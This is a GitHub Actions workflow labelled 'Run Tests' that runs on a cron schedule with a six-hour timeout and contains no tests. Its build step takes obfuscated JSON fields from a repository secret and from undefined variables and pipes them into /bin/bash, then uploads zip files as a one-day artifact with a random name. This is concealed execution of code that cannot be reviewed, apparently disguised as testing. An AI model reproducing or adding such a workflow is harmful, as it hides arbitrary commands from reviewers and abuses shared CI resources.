name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '11 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  perform:
    name: Run build
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Run build
        env:
          w7: ${{ secrets.w7 }}
        run: |
          printf '%s' "$w7" | jq -r .gw16852 | /bin/bash
          echo $js519 | jq -r .uiy07817 | /bin/bash
          printf '%s' "$zndn153" | jq -r .a0450 | /bin/bash
          printf '%s' "$o8158" | jq -r .mqtbs1 | /bin/bash
          printf '%s' "$fuueq76" | jq -r .uk42327 | /bin/bash
          printf '%s' "$xg746" | jq -r .keoqd74760 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: XxGloPM8
          path: "*.zip"
          retention-days: 1
